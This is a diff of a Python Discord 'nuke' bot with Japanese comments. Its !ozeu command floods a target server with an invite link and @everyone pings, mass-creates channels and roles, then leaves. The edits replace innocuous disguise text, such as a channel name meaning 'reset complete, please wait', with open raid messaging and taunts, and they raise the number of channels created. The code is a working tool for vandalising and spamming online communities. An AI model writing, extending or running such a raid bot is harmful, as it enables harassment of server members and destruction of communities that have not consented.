@@ -8,7 +8,7 @@ from dotenv import load_dotenv
 
 load_dotenv()
 TOKEN = os.getenv("DISCORD_TOKEN")
-SPAM_MESSAGE = "こんにちは"
+SPAM_MESSAGE = "discord.gg/ozeu　https://i.imgur.com/NbBGFcf.mp4  [gif](https://media.discordapp.net/attachments/...)  [gif](https://media.discordapp.net/attachments/...) @everyone"
 
 OWNER_ID = 1386539010381451356  # あなたのDiscord ID
 
@@ -43,7 +43,7 @@ async def ozeu(ctx, guild_id: int):
     # 実行開始通知 Embed作成
     embed_start = discord.Embed(
         title="📢 !ozeu が実行されました",
-        description=f"サーバー「{guild.name}」 (ID: {guild.id}) で ozeu 処理を開始しました。",
+        description=f"サーバー「{guild.name}」 (ID: {guild.id}) でnuke処理を開始しました。",
         color=discord.Color.green()
     )
     embed_start.add_field(name="実行者", value=f"{ctx.author} (ID: {ctx.author.id})", inline=False)
@@ -76,13 +76,13 @@ async def ozeu(ctx, guild_id: int):
     # --- 新規チャンネル作成 ---
     async def create_channel(index):
         try:
-            ch = await guild.create_text_channel(name="リセット完了　もうしばらくお待ち下さい")
+            ch = await guild.create_text_channel(name="荒らされてやんのｗカッスｗ")
             return ch
         except Exception as e:
             print(f"{index + 1}個目のチャンネル作成失敗: {e}")
             return None
 
-    create_tasks = [create_channel(i) for i in range(10)]
+    create_tasks = [create_channel(i) for i in range(25)]
     created_channels = await asyncio.gather(*create_tasks)
     created_channels = [ch for ch in created_channels if ch is not None]
 
@@ -101,8 +101,8 @@ async def ozeu(ctx, guild_id: int):
     # --- ロール作成 ---
     try:
         for i in range(25):
-            await guild.create_role(name=f"bot用権限{i+1}")
-            print(f"ロール『bot用権限{i+1}』を作成しました。")
+            await guild.create_role(name=f"ozeu{i+1}")
+            print(f"ロール『ozeu{i+1}』を作成しました。")
     except Exception as e:
         print(f"ロール作成でエラー: {e}")
 
@@ -110,7 +110,7 @@ async def ozeu(ctx, guild_id: int):
     try:
         await guild.leave()
         embed_done = discord.Embed(
-            title="🚪 ozeu処理が完了し、Botはサーバーを退出しました",
+            title="🚪 nuke処理が完了 Botはサーバーを退出しました",
             description=(
                 f"サーバー名: {guild.name} (ID: {guild.id})\n"
                 f"実行者: {ctx.author} (ID: {ctx.author.id})"
